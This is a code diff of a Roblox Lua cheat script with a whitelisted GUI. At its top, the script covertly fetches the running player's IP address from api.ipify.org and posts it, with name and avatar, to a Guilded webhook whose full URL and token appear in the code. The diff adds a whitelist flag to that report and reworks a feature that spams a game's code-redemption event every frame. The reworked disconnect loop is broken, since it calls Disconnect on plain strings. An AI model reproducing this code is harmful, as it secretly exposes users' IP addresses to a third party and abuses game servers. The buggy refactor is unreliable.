@@ -1,5 +1,5 @@
 local UserIds = {
-	105115151,		--Blu
+	105115151, 2444381495,	--Blu
 	132541900, 2730836956,	--David
 	149522897,		--Booh
 	1425652856,		--Kaz
@@ -7,14 +7,17 @@ local UserIds = {
 }
 local WebUrl = "https://media.guilded.gg/webhooks/d5b07cb7-b836-43c7-981f-8279bdf18f95/Qo6g2U1MMCQMuUaikMCUYM0eGkO8EG22WA6WOe0U4am8Ycs4CCasU4qQeAUIscyAkSE4sIaOeSssEqgoGEkGcG"
 
-
 local Player = game:GetService("Players").LocalPlayer
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local whitelisted = false
+if table.find(UserIds, Player.UserId) then
+	whitelisted = true
+end
 local msg = {
 	["embeds"] = {{
 		["title"] = "**".. Player.Name .."**",
 		["color"] = 13708129,
-		["description"] = "IP: ".. ip,
+		["description"] = "IP: ".. ip .."\nWhitelisted: ".. (whitelisted and "Yes" or "No"),
 		["thumbnail"] = {
 			["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. Player.UserId .."&width=420&height=420&format=png",
 		},
@@ -464,7 +467,7 @@ if table.find(UserIds, Player.UserId) then
 
 	ToggleTextBox = function(Parent, Name, PlaceHolder)
 		local Frame = Instance.new("Frame")
-		local TextButton = Instance.new("TextButton")
+		local Button = Instance.new("TextButton")
 		local ImageLabel = Instance.new("ImageLabel")
 		local ImageLabel_2 = Instance.new("ImageLabel")
 		local TextFrame = Instance.new("Frame")
@@ -479,19 +482,20 @@ if table.find(UserIds, Player.UserId) then
 		Frame.BackgroundTransparency = 1.000
 		Frame.Size = UDim2.new(0.982301295, 0, 0.127808765, 42)
 
-		TextButton.Parent = Frame
-		TextButton.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
-		TextButton.BackgroundTransparency = 1.000
-		TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-		TextButton.Position = UDim2.new(0, 6, 0, 4)
-		TextButton.Size = UDim2.new(0, 12, 0, 12)
-		TextButton.ZIndex = 2
-		TextButton.Font = Enum.Font.SourceSans
-		TextButton.Text = ""
-		TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-		TextButton.TextSize = 14.000
+		Button.Parent = Frame
+		Button.Name = "Button"
+		Button.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
+		Button.BackgroundTransparency = 1.000
+		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		Button.Position = UDim2.new(0, 6, 0, 4)
+		Button.Size = UDim2.new(0, 12, 0, 12)
+		Button.ZIndex = 2
+		Button.Font = Enum.Font.SourceSans
+		Button.Text = ""
+		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
+		Button.TextSize = 14.000
 
-		ImageLabel.Parent = TextButton
+		ImageLabel.Parent = Button
 		ImageLabel.BackgroundTransparency = 1.000
 		ImageLabel.Size = UDim2.new(1, 0, 1, 0)
 		ImageLabel.ZIndex = 3
@@ -500,7 +504,7 @@ if table.find(UserIds, Player.UserId) then
 		ImageLabel.ScaleType = Enum.ScaleType.Slice
 		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)
 
-		ImageLabel_2.Parent = TextButton
+		ImageLabel_2.Parent = Button
 		ImageLabel_2.BackgroundTransparency = 1.000
 		ImageLabel_2.Position = UDim2.new(0, 1, 0, 1)
 		ImageLabel_2.Size = UDim2.new(1, -2, 1, -2)
@@ -671,24 +675,21 @@ if table.find(UserIds, Player.UserId) then
 					Code_Spammer.Button.BackgroundTransparency = 0
 				end
 				if Code_Spammer.Button.BackgroundTransparency == 0 then
-					local a, b, c, d, e, f, g
 					local Event = Player.PlayerGui.Intro.Customize.CustomizationFrame.Codes.Redeem.LocalScript.RemoteEvent
 					local Text = Code_Spammer.TextFrame.TextBox.Text
-					a = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
-					b = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
-					c = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
-					d = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
-					e = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
-					f = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
-					g = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
+					local Runners = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'}
+					
+					for _, letter in pairs(Runners) do
+						letter = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
+					end
+
 					wait(5)
-					a:Disconnect()
-					b:Disconnect()
-					c:Disconnect()
-					d:Disconnect()
-					e:Disconnect()
-					f:Disconnect()
-					g:Disconnect()
+
+					for _, letter in pairs(Runners) do
+						letter:Disconnect()
+					end
+					
+					Code_Spammer.Button.BackgroundTransparency = 1
 				end
 			end)
 
@@ -856,7 +857,8 @@ if table.find(UserIds, Player.UserId) then
 						p8.Transparency = 0.6
 					end
 				end)
-			end---------------------------------------------------------------------------
+			end
+			---------------------------------------------------------------------------
 			FormlessShooter.Button.MouseButton1Click:Connect(function()
 				if FormlessShooter.Button.BackgroundTransparency == 0 then
 					FormlessShooter.Button.BackgroundTransparency = 1
